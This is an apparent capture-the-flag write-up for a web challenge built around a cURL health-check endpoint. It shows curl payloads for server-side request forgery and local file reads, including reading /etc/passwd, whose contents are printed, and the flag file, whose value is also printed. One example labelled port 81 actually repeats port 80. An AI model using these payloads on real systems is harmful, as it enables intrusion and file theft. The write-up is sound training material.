> We've built the most secure cURL-based post-deploy healthcheck tool in the market, come and check it out!

![[Pasted image 20250327211307.png]]

This application allows us to enter a URL and the server runs cURL against it. This indicates a potential opportunity for Server-Side Request Forgery. By inspecting the HTTP traffic, we see that we can curl any website, including localhost, by passing it as the "host" parameter to the /api/curl endpoint.

Since we're able to make the server scan itself, we should be able to enumerate the system further.

We could enumerate other ports by fuzzing port numbers based off of the response given for an unsuccessful run. For instance:

Successful port 80:
`curl http://83.136.253.25:31701/api/curl -d "host=http%3a%2f%2flocalhost:80"`

```
{"message":"<html>\n<head>\n    <title>Health Checker v1.1<\/title>\n    <link rel=\"icon\" t
ype=\"image\/png\" href=\"\/static\/favicon.png\">\n    <link rel=\"stylesheet\" type=\"text\
/css\" href=\"\/static\/css\/prism.css\" \/>\n    <link rel=\"stylesheet\" 
...
```

Unsuccessful port 81:
`curl http://83.136.253.25:31701/api/curl -d "host=http%3a%2f%2flocalhost:80"`

`{"message":false}`

However, I found that we're also able to simply curl local files, giving us local file inclusion.
`curl http://83.136.253.25:31701/api/curl -d "host=file:///etc/passwd"`

```
{"message":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:100:65534::\/nonexistent:\/usr\/sbin\/nologin\nwww:x:1000:1000::\/home\/www:\/bin\/sh\nmessagebus:x:101:101::\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:\/run\/systemd:\/usr\/sbin\/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:\/run\/systemd:\/usr\/sbin\/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:\/run\/systemd:\/usr\/sbin\/nologin\n"}
```

Since we have the application's source including the Dockerfile, we're able to see that the flag is copied to /flag.txt. 

```Dockerfile
...
# Copy flag
COPY flag /flag.txt
...
```

Using the previous curl payload we're able to read the flag at this location:
`curl http://83.136.253.25:31701/api/curl -d "host=file:///flag.txt"`

`{"message":"HTB{SSrFs_4r3_fun!_0eadf818e1c147537c79548e711b7992}"}`